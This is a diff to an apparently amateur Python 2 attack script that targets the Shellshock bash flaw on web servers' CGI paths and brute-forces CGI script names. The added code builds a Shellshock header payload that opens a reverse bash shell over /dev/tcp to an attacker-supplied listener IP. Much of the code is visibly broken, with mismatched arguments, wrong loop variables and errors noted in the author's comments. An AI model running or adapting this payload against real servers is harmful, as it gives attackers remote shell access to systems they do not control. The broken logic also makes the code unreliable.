@@ -1,6 +1,6 @@
 import httplib
 import time
-import sys
+import sys, os
 
 target_host = ''
 target_port = 80  # Default HTTP port
@@ -80,24 +80,25 @@ def Shock(target_host, target_port, target_path, listener):
     return result
 
 
-def Bruteforce_CGIS(target_host,target_port,dictionary_path):
+def Bruteforce_CGIS(target_host,target_port,dictionary_path,listener):
+    ### Opening the dict file
+    try:
+        open(dictionary_path,'r')
+    except IOError:
+        print 'File or directory not found.'
+        banner()
+    reverse_shell = "() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % listener
     print 'Running in the Brute-Force mode.'
-    brute_headers = {"Content-type": "application/x-www-form-urlencoded",
+    brute_headers = {
+                    'Accept' : 'lol',
                      "Connection": "Close"
     }
     result = False
     con = httplib.HTTPConnection(host=target_host, port=target_port)
-    if dictionary_path:
-        dictionary = open('cgis.txt','r')
-    else:
-        try:
-            dict = open(dictionary_path,'r')
-        except IOError:
-            print 'No such file.'
-            return False
-            banner()
-    for line in dictionary:
-        req = con.request("GET", url=target_path, headers=malicious_headers)
+
+
+    for line in dictionary_path:
+        req = con.request("GET", url=target_path, headers=brute_headers)
         response = con.getresponse()
         if response == 200:
             print line, response.status,response.reason
@@ -110,7 +111,7 @@ def Bruteforce_CGIS(target_host,target_port,dictionary_path):
 def Connection_check(target_host,target_port,target_path,legit_headers):
     result = False
     con = httplib.HTTPConnection(host=target_host,port=target_port)
-    req = con.request("GET",url=target_path,headers=legit_headers)
+    req = con.request("GET",url=target_path, headers=legit_headers) ### Socket error number 10061, could be poor net~~~~~
     response = con.getresponse()
     print response.status,response.reason,response.msg
     if response.status == 403:
@@ -146,9 +147,15 @@ flag = sys.argv[1]
 
 if flag == 'b':
     target_host = sys.argv[2]
-    if len(sys.argv[3]) != 0:
+    print len(sys.argv)
+    if len(sys.argv) > 3:
+        print 'Amount of sys.argv is bigger then 3, setting up the user provided dictionary'
         dictionary_path = sys.argv[4]
+    else:
+        dictionary_path = open('cgis.txt','r')          ### No such file or dictionary error ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    listener = raw_input('Enter the listener IP (IP/port):')
     Bruteforce_CGIS(target_host, target_port, dictionary_path)
+    exit()
 if flag == 'h':
     print 'This function is currently developed and not yet avaliable'
     banner()
@@ -159,9 +166,9 @@ if flag == 't':
         Shock(target_host, target_port, target_path, listener)
     else:
         pass
-print 'Sys args: ',sys.argv
-print 'args length:',len(sys.argv)
-
+else:
+    print 'Wrong amount of arguments given'
+    banner()
 
 """
 print 'Testing connection with',target_host,'Path:',target_path,'Port:',target_port
@@ -177,10 +184,3 @@ else:
     time.sleep(2)
     banner()
 """
-
-
-
-
-
-
-    ### Finish the sys.argv, attack selection
